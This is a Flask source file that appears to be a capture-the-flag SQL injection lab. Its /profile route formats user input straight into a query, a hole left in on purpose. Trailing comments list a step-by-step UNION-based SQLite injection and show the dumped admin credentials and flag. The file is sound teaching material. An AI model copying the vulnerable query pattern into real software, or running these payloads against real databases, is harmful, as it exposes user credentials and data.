
import sqlite3
from flask import Flask, render_template, request, flash,redirect,url_for,abort

app = Flask(__name__)

app.config["SECRET_KEY"] = "mykey"

def get_db_connection():
    #print("here")
    conn = sqlite3.connect('database.db')
    conn.row_factory = sqlite3.Row
    return conn


@app.route('/')
def index():
     return render_template('base.html')

@app.route('/enter')
def enter():
    return render_template("index.html")

@app.route('/register')
def register():
        username1 = request.args.get('username')
        password = request.args.get('pass')
        content = request.args.get('content')
        print("Here")
        if username1 == "":
            flash('Username is required!')
        elif password == "":
            flash('Password is required!')
        elif content == "":
            flash('Signature is required!')
        else:
            print("",username1,password,content)
            conn = get_db_connection()
            conn.execute("INSERT INTO users (user, pass, content) VALUES (?, ?, ?)",(username1,password,content))
            conn.commit()
            conn.close()
            return render_template('login.html')
 
        return render_template('index.html')

@app.route('/login')
def login():
    return render_template('login.html')

@app.route('/profile')
def profile():
    errr = 0
    correct = 0
    username = request.args.get('username')
    password = request.args.get('pass')
    if "users" in username:
        username = ""
    if "users" in password:
        password = ""
    conn = get_db_connection()
    query = "Select * FROM users WHERE user='{}' AND pass='{}'".format(username,password)
    #print(query)
    try:
        data = conn.execute(query)
        #print(str(type(data)))
        if "sqlite3.Cursor" in str(type(data)):
            #print("inside")
            data1 = []
            count = 1
            for i in data : 
                for count in range(4) :
                    data1.append(str(i[count]))
               
            #print(data1)
            data = data1
            correct = 1
    except Exception as err:
        errr = 1
        data = err
        #print("err ",data)
    conn.close()
    if data is None:
        abort(404)
    #print("final ",data,errr)
    return render_template('profile.html',data=data,errr=errr,correct=correct)

@app.route('/admin')
def admin():
    conn = get_db_connection()
    query = "Select * FROM users"
    data = conn.execute(query).fetchall()
    for i in data:
        print("",i['user'],i['pass'],i['content'])
    conn.close()
    


if __name__ == "__main__" :
    
    app.run()


# conn = get_db_connection()
# query = "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union SELECT 1,user,pass,content from users;--","sahil")
# print(query)
# data = conn.execute(query).fetchall()
# for i in data:
#     print("",i['user'],i['pass'],i['content'])
# conn.close()

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' order by 2000;--","sahil")
    #sqlite3.OperationalError: 1st ORDER BY term out of range - should be between 1 and 4

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union select 1,2,3,4;--","sahil")
    # 2 3 4
    # sahil sahil sahil

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union select 1,sqlite_version(),3,4;--","sahil")
    # 3.35.5 3 4
    # sahil sahil sahil

''' In vulnerable application, if we craft it like this
http://127.0.0.1/sqlite-lab/index.php?snumber=1337 union SELECT
1,group_concat(tbl_name),3,4,5 FROM sqlite_master WHERE
type='table' and tbl_name NOT like 'sqlite_%' '''

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union SELECT 1,group_concat(tbl_name),3,4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%';--","sahil")
    #  users 3 4
    # sahil sahil sahil

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union SELECT 1,sql,3,4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name='Admins';--","sahil")
'''CREATE TABLE Admins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user TEXT NOT NULL,
    pass TEXT NOT NULL,
    content TEXT NOT NULL

    ) 3 4
    sahil sahil sahil '''

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union SELECT 1,user,3,4 from Admins;--","sahil")
'''
    Adminnn 3 4
    sahil 3 4
    user 3 4
    sahil sahil sahil

'''

# "Select * FROM users WHERE user='{}' AND pass='{}'".format("sahil' union SELECT 1,user,pass,content from Admins;--","sahil")
'''
 Adminnn H4rD_t0_Gue5s shellctf{Sql_1Nj3c7i0n}
 sahil sahil sahil
 user P4ss321 Nothing here
 sahil sahil sahi

'''